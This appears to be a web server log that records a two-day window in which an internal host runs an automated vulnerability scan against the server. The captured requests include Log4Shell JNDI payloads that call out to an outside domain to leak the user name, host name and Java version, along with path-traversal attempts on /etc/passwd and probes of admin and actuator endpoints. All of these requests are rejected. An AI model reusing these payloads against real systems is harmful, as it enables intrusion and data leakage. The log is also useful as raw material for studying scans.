+E0626 10:58:22.591697 140431069280000 _internal.py:96] 10.21.146.68 - - [26/Jun/2024 10:58:22] code 400, message Bad request version ('À\x13À')
+E0626 13:56:44.945193 140431016830720 _internal.py:96] 10.21.146.68 - - [26/Jun/2024 13:56:44] code 400, message Bad request version ('À\x13À')
+W0626 15:35:44.642731 140431048300288 application.py:559] path /Inter-roman-latin.var.woff2 not found, sending 404
+W0626 15:35:44.652399 140431016830720 application.py:559] path /source-code-pro-v21-latin-regular.woff2 not found, sending 404
+W0626 15:35:44.739032 140431016830720 application.py:559] path /source-code-pro-v21-latin-regular.woff not found, sending 404
+W0626 15:35:44.747711 140431048300288 application.py:559] path /source-code-pro-v21-latin-600.woff2 not found, sending 404
+W0626 15:35:44.758917 140431016830720 application.py:559] path /source-code-pro-v21-latin-600.woff not found, sending 404
+W0626 15:35:44.932137 140431016830720 application.py:559] path /Inter-roman-latin.var.woff2 not found, sending 404
+W0626 15:35:45.065721 140431016830720 application.py:559] path /source-code-pro-v21-latin-regular.woff2 not found, sending 404
+E0626 16:55:27.992234 140431037810432 _internal.py:96] 10.21.146.68 - - [26/Jun/2024 16:55:27] code 400, message Bad request version ('À\x13À')
+E0626 19:54:58.435838 140431048300288 _internal.py:96] 10.21.146.68 - - [26/Jun/2024 19:54:58] code 400, message Bad request version ('À\x13À')
+E0626 22:51:04.091331 140431027320576 _internal.py:96] 10.21.146.73 - - [26/Jun/2024 22:51:04] code 400, message Bad request syntax ('\x16\x03\x01\x00ü\x01\x00\x00ø\x03\x03\x13Ì\x16´ÆÁ1\x94&\x99Ë\x8c}säªQaÔ')
+E0627 01:50:24.759352 140431027320576 _internal.py:96] 10.21.146.68 - - [27/Jun/2024 01:50:24] code 400, message Bad request version ('À\x13À')
+E0627 04:50:10.903517 140431027320576 _internal.py:96] 10.14.117.25 - - [27/Jun/2024 04:50:10] code 400, message Bad request version ('À\x13À')
+E0627 07:46:34.933439 140431027320576 _internal.py:96] 10.14.117.25 - - [27/Jun/2024 07:46:34] code 400, message Bad request version ('K')
+E0627 10:45:08.784729 140431058790144 _internal.py:96] 10.21.146.68 - - [27/Jun/2024 10:45:08] code 400, message Bad request version ('À\x13À')
+E0627 13:44:41.297344 140431058790144 _internal.py:96] 10.14.117.25 - - [27/Jun/2024 13:44:41] code 400, message Bad request version ('À\x13À')
+W0627 13:56:44.195096 140431058790144 application.py:559] path /api/v1 not found, sending 404
+W0627 13:56:44.637152 140431058790144 application.py:559] path /v2/keys not found, sending 404
+E0627 13:56:44.760299 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:56:44] code 400, message Bad request version ('$')
+W0627 13:56:44.890170 140431058790144 application.py:559] path /v3/kv/range not found, sending 404
+E0627 13:56:45.189178 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:56:45] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 13:57:14.744972 140431058790144 application.py:559] path /v1/submissions not found, sending 404
+W0627 13:57:21.587291 140431058790144 application.py:559] path /druid/index.html not found, sending 404
+E0627 13:57:21.675208 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:57:21] code 400, message Bad request version ('8y\x884')
+W0627 13:57:42.896063 140431058790144 application.py:559] path /version not found, sending 404
+E0627 13:57:43.244771 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:57:43] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 13:58:01.045908 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:58:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 13:58:02.989220 140431058790144 application.py:559] path /rs-status not found, sending 404
+W0627 13:58:03.229870 140431058790144 application.py:559] path /master-status not found, sending 404
+E0627 13:58:03.440085 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:58:03] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 13:58:04.294692 140431058790144 application.py:559] path /currentUser not found, sending 404
+E0627 13:58:05.034061 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:58:05] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 13:58:31.384001 140431058790144 application.py:559] path /login not found, sending 404
+E0627 13:58:31.529404 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 13:58:31] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03r>\x9bë(N«\x17Lu\x8d½ä\x90*P_\x9b')
+E0627 14:00:45.483546 140431027320576 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:00:45] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:00:45.503813 140431027320576 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:00:45] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:00:54.366924 140431027320576 application.py:559] path /admin not found, sending 404
+E0627 14:00:59.228547 140431027320576 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:00:59] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:01:10.961812 140431027320576 application.py:559] path /v2/_catalog not found, sending 404
+E0627 14:01:11.084668 140431027320576 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:01:11] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:01:29.272012 140431027320576 application.py:559] path /index/api/getServerConfig not found, sending 404
+E0627 14:01:29.447589 140431027320576 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:01:29] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:02:04.686070 140431058790144 application.py:559] path /nacos/v1/core/cluster/nodes not found, sending 404
+E0627 14:02:05.224544 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:02:05] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:02:23.733823 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:02:23] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:02:51.270646 140431058790144 application.py:559] path /login not found, sending 404
+E0627 14:02:51.389620 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:02:51] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:03:01.636178 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:03:01] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:03:33.925489 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:03:33] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Ï\x18\x8eEáç')
+W0627 14:03:48.223809 140431058790144 application.py:559] path /solr not found, sending 404
+E0627 14:03:48.437282 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:03:48] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:03:57.766365 140431058790144 application.py:559] path /terminals/3 not found, sending 404
+E0627 14:03:58.168736 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:03:58] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:04:18.584333 140431058790144 application.py:559] path /query not found, sending 404
+E0627 14:04:18.833702 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:04:18] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:04:25.057721 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:04:25] code 400, message Bad request syntax ('\x00\x00\x00d\x00\x00\x00`{"code":26,"flag":0,"language":"JAVA","opaque":0,"serializeTypeCurrentRPC":"JSON","version":395}')
+W0627 14:04:26.757288 140431058790144 application.py:559] path /v1/agent/members not found, sending 404
+E0627 14:04:26.943916 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:04:26] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03?\x8f\x97\x9eÀµñæ ')
+W0627 14:04:30.640814 140431058790144 application.py:559] path /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp not found, sending 404
+W0627 14:04:49.191095 140431058790144 application.py:559] path /api/v1/cluster/summary not found, sending 404
+E0627 14:04:49.394433 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:04:49] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:14.891506 140431058790144 application.py:559] path /api/v1/users/admin not found, sending 404
+E0627 14:05:15.167132 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:15] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:29.391717 140431058790144 application.py:559] path /xxl-job-admin/login not found, sending 404
+E0627 14:05:29.872829 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:29] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:05:39.391141 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:39] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03K¸5Û\x07æ\x02t».I6¹(Áã&¸h')
+W0627 14:05:39.490602 140431058790144 application.py:559] path /es not found, sending 404
+E0627 14:05:39.691555 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:39] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:39.790862 140431058790144 application.py:559] path /elasticsearch not found, sending 404
+E0627 14:05:39.981397 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:39] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:40.080150 140431058790144 application.py:559] path /es/elasticsearch not found, sending 404
+E0627 14:05:40.184687 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:40] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:40.283622 140431058790144 application.py:559] path /elastic not found, sending 404
+E0627 14:05:40.479309 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:40] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:05:40.662679 140431058790144 application.py:559] path /search not found, sending 404
+E0627 14:05:40.788830 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:05:40] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:06:45.292012 140431058790144 application.py:559] path /apisix/admin/routes not found, sending 404
+E0627 14:06:49.280756 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:06:49] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:07:23.869955 140431058790144 application.py:559] path /actuator/gateway/routes/secscan9aec not found, sending 404
+W0627 14:07:23.908266 140431058790144 application.py:559] path /actuator/gateway/refresh not found, sending 404
+W0627 14:07:24.061624 140431058790144 application.py:559] path /actuator/gateway/routes/secscan9aec not found, sending 404
+W0627 14:07:26.170868 140431058790144 application.py:559] path /run not found, sending 404
+W0627 14:07:27.395318 140431058790144 application.py:559] path /run not found, sending 404
+E0627 14:07:29.040129 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:07:29] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:07:29.188962 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:07:29] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:07:55.889311 140431058790144 application.py:559] path /j_acegi_security_check not found, sending 404
+E0627 14:07:56.273335 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:07:56] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:07:56.688669 140431058790144 application.py:559] path /j_spring_security_check not found, sending 404
+E0627 14:07:56.789959 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:07:56] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:08:12.510303 140431058790144 application.py:559] path /${jndi:ldap://log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/aaa} not found, sending 404
+W0627 14:08:13.106721 140431058790144 application.py:559] path /%24%7Bjndi%3Aldap%3A%2F%2Flog4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Faaa%7D not found, sending 404
+W0627 14:08:13.779978 140431058790144 application.py:559] path /${j${k8s:k5:-ND}i:ldap://${sys:user.name}.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/xxx} not found, sending 404
+W0627 14:08:14.295951 140431058790144 application.py:559] path /%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%3A%2F%2F%24%7Bsys%3Auser.name%7D.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Fxxx%7D not found, sending 404
+W0627 14:08:15.372004 140431058790144 application.py:559] path /${jndi:rmi://${hostName}.log4j.${java:version}.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/em4fmk} not found, sending 404
+W0627 14:08:16.273784 140431058790144 application.py:559] path /%24%7Bjndi%3Armi%3A%2F%2F%24%7BhostName%7D.log4j.%24%7Bjava%3Aversion%7D.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Fem4fmk%7D not found, sending 404
+W0627 14:08:17.785956 140431058790144 application.py:559] path /${jndi:ldap://log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/aaa} not found, sending 404
+W0627 14:08:18.680759 140431058790144 application.py:559] path /%24%7Bjndi%3Aldap%3A%2F%2Flog4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Faaa%7D not found, sending 404
+W0627 14:08:19.784726 140431058790144 application.py:559] path /${j${k8s:k5:-ND}i:ldap://${sys:user.name}.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/xxx} not found, sending 404
+W0627 14:08:20.681663 140431058790144 application.py:559] path /%24%7Bj%24%7Bk8s%3Ak5%3A-ND%7Di%3Aldap%3A%2F%2F%24%7Bsys%3Auser.name%7D.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Fxxx%7D not found, sending 404
+W0627 14:08:21.898787 140431058790144 application.py:559] path /${jndi:rmi://${hostName}.log4j.${java:version}.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top/em4fmk} not found, sending 404
+W0627 14:08:23.888056 140431058790144 application.py:559] path /%24%7Bjndi%3Armi%3A%2F%2F%24%7BhostName%7D.log4j.%24%7Bjava%3Aversion%7D.log4j6fd262a306585550dcb6ee91e3f547d9.hacked.bdsec.top%2Fem4fmk%7D not found, sending 404
+W0627 14:09:09.603770 140431058790144 application.py:559] path /RPC2 not found, sending 404
+E0627 14:09:11.078957 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:09:11] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:09:31.211539 140431058790144 application.py:559] path /run not found, sending 404
+E0627 14:09:32.296447 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:09:32] code 400, message Bad request version ("\x08¨'")
+W0627 14:09:34.693719 140431058790144 application.py:559] path /druid/indexer/v1/sampler not found, sending 404
+W0627 14:10:11.499943 140431058790144 application.py:559] path /console/images/%2E%2E%2Fconsole.portal not found, sending 404
+E0627 14:10:12.480185 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:10:12] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:11:28.150910 140431058790144 application.py:559] path /app/rest/users/id:1/tokens/RPC2 not found, sending 404
+W0627 14:11:28.274482 140431058790144 application.py:559] path /app/rest/users/id:1/tokens/RPC2 not found, sending 404
+W0627 14:11:28.681951 140431027320576 application.py:559] path /ws/v1/cluster/apps/new-application not found, sending 404
+E0627 14:11:28.737995 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:11:28] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+W0627 14:12:17.211079 140431058790144 application.py:559] path /../../../../../etc/passwd not found, sending 404
+W0627 14:12:17.495034 140431058790144 application.py:559] path /.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd not found, sending 404
+W0627 14:12:17.587373 140431058790144 application.py:559] path /icons/../../../../../etc/passwd not found, sending 404
+W0627 14:12:17.785728 140431058790144 application.py:559] path /icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd not found, sending 404
+E0627 14:12:18.230733 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:12:18] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 14:12:18.386017 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:12:18] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03Qæ\x9cÊ½i\x9eLlç\x95xímßÐ¥Æ6§\x19')
+E0627 14:12:18.487913 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:12:18] code 400, message Bad request syntax ('\x16\x03\x01\x02\x00\x01\x00\x01ü\x03\x03[ú"u ')
+E0627 14:12:18.585643 140431058790144 _internal.py:96] 10.14.198.37 - - [27/Jun/2024 14:12:18] code 400, message Bad request version ('\x00\x04\x03\x00\x01\x02\x00')
+E0627 16:41:14.512941 140431058790144 _internal.py:96] 10.21.146.68 - - [27/Jun/2024 16:41:14] code 400, message Bad request version ('\x9d\x10|zÊN')
+E0627 19:40:53.434779 140431069280000 _internal.py:96] 10.21.146.68 - - [27/Jun/2024 19:40:53] code 400, message Bad request version ('À\x13À')
+E0627 22:37:10.115990 140431069280000 _internal.py:96] 10.21.146.68 - - [27/Jun/2024 22:37:10] code 400, message Bad request version ('À\x13À')
